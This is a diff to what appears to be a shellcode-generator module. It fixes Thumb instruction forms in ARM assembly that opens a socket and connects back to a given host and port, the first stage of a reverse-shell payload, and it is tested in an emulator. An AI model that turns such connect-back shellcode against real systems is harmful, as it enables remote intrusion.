@@ -17,22 +17,22 @@ def generate(host='127.0.0.1', port=31337):
     """
 
     sc = """
-    mov r0, #2
-    mov r1, #1
-    sub r2, r2, r2
-    sub r7, r7, r7
-    add r7, r7, #255
-    add r7, r7, #26
+    movs r0, #2
+    movs r1, #1
+    subs r2, r2, r2
+    subs r7, r7, r7
+    adds r7, r7, #255
+    adds r7, r7, #26
     svc 1
     #adr r1, sockaddr_1
     mov r1, pc
-    add r1, #12
-    mov r2, #16
-    mov r3, #2
+    adds r1, #12
+    movs r2, #16
+    movs r3, #2
     mov r6, r0
     strh r3, [r1]
     b after_sockaddr_2
-    sub r1, r1, r1
+    subs r1, r1, r1
 
 sockaddr_1:
     .short 0x4141
@@ -40,9 +40,9 @@ sockaddr_1:
     .word  %s
     
 after_sockaddr_2:
-    sub r7, r7, r7
-    add r7, r7, #255
-    add r7, r7, #28
+    subs r7, r7, r7
+    adds r7, r7, #255
+    adds r7, r7, #28
     svc 1
     """ % (htons(int(port)), u32(binary_ip(host)))
     return sc
@@ -53,6 +53,3 @@ def testcase(host='127.0.0.1', port=31337):
     sclen = len(sc)
     print "[+] Registers information"
     scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
-
-if __name__ == '__main__':
-    print generate()
